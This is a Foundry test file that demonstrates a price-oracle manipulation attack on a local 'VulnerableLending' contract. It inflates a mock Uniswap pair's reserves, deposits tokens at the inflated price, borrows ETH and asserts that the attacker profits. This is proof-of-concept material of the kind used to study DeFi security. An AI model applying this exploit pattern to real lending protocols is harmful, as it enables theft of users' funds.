// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../src/VulnerableLending.sol";
import "lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

// Mock Token for testing
contract MockToken is ERC20 {
    constructor() ERC20("Mock Token", "MTK") {
        _mint(msg.sender, 1000000 * 10**18);
    }
}

// Mock Uniswap V2 Pair
contract MockUniswapV2Pair is IUniswapV2Pair {
    address public override token0;
    address public override token1;
    uint112 private reserve0;
    uint112 private reserve1;
    
    constructor(address _token0, address _token1) {
        token0 = _token0;
        token1 = _token1;
        // Initial reserves: 1000 tokens = 1 ETH
        reserve0 = 1000 * uint112(10**18); // tokens
        reserve1 = 1 * uint112(10**18);    // ETH
    }
    
    function getReserves() external view override returns (uint112, uint112, uint32) {
        return (reserve0, reserve1, uint32(block.timestamp));
    }
    
    // Function to set reserves for testing
    function setReserves(uint112 _reserve0, uint112 _reserve1) external {
        reserve0 = _reserve0;
        reserve1 = _reserve1;
    }
}

contract PriceManipulationTest is Test {
    VulnerableLending public lending;
    PriceManipulationAttack public attacker;
    MockUniswapV2Pair public pair;
    MockToken public token;
    
    address payable public constant FLASH_LOAN_PROVIDER = payable(address(0x1));
    address payable public constant ATTACKER = payable(address(0x2));
    
    function setUp() public {
        // Deploy mock token
        token = new MockToken();
        
        // Deploy mock Uniswap pair
        pair = new MockUniswapV2Pair(address(token), address(0x354));
        
        // Deploy vulnerable lending protocol
        lending = new VulnerableLending(address(pair), address(token));
        
        // Fund the lending protocol with some ETH
        vm.deal(address(lending), 100 ether);
        
        // Deploy attacker contract
        attacker = new PriceManipulationAttack(
            address(pair),
            payable(address(lending)),
            address(token)
        );
        
        // Setup initial balances and approvals
        token.transfer(ATTACKER, 1000 ether);
        vm.prank(ATTACKER);
        token.approve(address(attacker), type(uint256).max);
    }
    
    function testInitialSetup() public {
        assertEq(token.balanceOf(ATTACKER), 1000 ether, "Attacker should have initial tokens");
        assertEq(address(lending).balance, 100 ether, "Lending protocol should have initial ETH");
        
        // Check initial price (should be 1 ETH = 1000 tokens)
        uint256 initialPrice = lending.getPrice();
        console.log("Initial token price (in ETH): ", initialPrice / 1e18);
        assertGt(initialPrice, 0, "Initial price should be set");
    }
    
    function testPriceManipulation() public {
        // Record initial states
        uint256 initialPrice = lending.getPrice();
        uint256 initialAttackerEthBalance = address(ATTACKER).balance;
        console.log("Initial price (in ETH): ", initialPrice / 1e18);
        
        // Simulate flash loan by directly manipulating reserves
        // Increasing ETH reserve relative to token reserve makes tokens appear more valuable
        pair.setReserves(
            1000 * uint112(10**18),    // token reserve stays same
            10 * uint112(10**18)       // 10x more ETH (makes token more valuable)
        );
        
        // Check manipulated price
        uint256 manipulatedPrice = lending.getPrice();
        console.log("Manipulated price (in ETH): ", manipulatedPrice / 1e18);
        assertTrue(manipulatedPrice > initialPrice, "Price should be manipulated higher");
        
        // Perform attack
        vm.startPrank(ATTACKER);
        
        // Deposit tokens at manipulated high price
        uint256 depositAmount = 100 ether; // 100 tokens
        token.approve(address(lending), depositAmount);
        lending.deposit(depositAmount);
        
        // Borrow ETH based on inflated token price
        lending.borrow(depositAmount);
        
        vm.stopPrank();
        
        // Verify attack results
        uint256 finalAttackerEthBalance = address(ATTACKER).balance;
        console.log("ETH gained by attacker: ", (finalAttackerEthBalance - initialAttackerEthBalance) / 1e18);
        
        assertTrue(
            finalAttackerEthBalance > initialAttackerEthBalance,
            "Attacker should have profited in ETH"
        );
    }
}